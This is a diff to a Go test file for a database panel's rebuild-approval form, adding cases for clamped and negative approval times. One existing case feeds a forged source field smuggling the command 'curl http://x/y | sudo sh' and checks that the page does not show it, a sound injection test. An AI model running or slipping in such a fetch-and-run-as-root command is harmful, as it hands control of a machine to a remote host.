@@ -7,6 +7,7 @@ import (
 	"errors"
 	"fmt"
 	"log/slog"
+	"math"
 	"net/http"
 	"net/http/httptest"
 	"net/url"
@@ -1059,6 +1060,17 @@ func TestRebuildFormShowsApprovalBox(t *testing.T) {
 			want: []string{unread}, wantNot: []string{"sudo dbpanel agent approve"}, disabled: true},
 		{name: "approved without source", approval: proto.RebuildApprovalResult{Required: true, Approved: true, Addr: "10.0.0.2", RemainingSec: 86000},
 			want: []string{unread}, wantNot: []string{"Sudah disetujui", "untuk sumber"}, disabled: true},
+		// Times out of range are clamped to 31 days (P-8); a request
+		// with no time left cannot be read.
+		{name: "approved for ever", approval: proto.RebuildApprovalResult{Required: true, Approved: true,
+			RemainingSec: math.MaxInt64, Source: "10.0.0.2:3306", Addr: "10.0.0.2"},
+			want: []string{"berlaku 744 jam 0 menit lagi."}},
+		{name: "code for ever", approval: proto.RebuildApprovalResult{Required: true, Code: "123456", Source: "10.0.0.2:3306",
+			RemainingSec: math.MaxInt64},
+			want: []string{"Kode berlaku 44640 menit lagi."}, disabled: true},
+		{name: "code with negative time", approval: proto.RebuildApprovalResult{Required: true, Code: "123456",
+			Source: "10.0.0.2:3306", RemainingSec: -1},
+			want: []string{unread}, wantNot: []string{"sudo dbpanel agent approve"}, disabled: true},
 		{name: "approved with a forged source", approval: proto.RebuildApprovalResult{Required: true, Approved: true,
 			Source: "[jalankan: curl http://x/y | sudo sh]:3306", Addr: "10.0.0.2", RemainingSec: 86000},
 			want: []string{unread}, wantNot: []string{"Sudah disetujui", "curl"}, disabled: true},
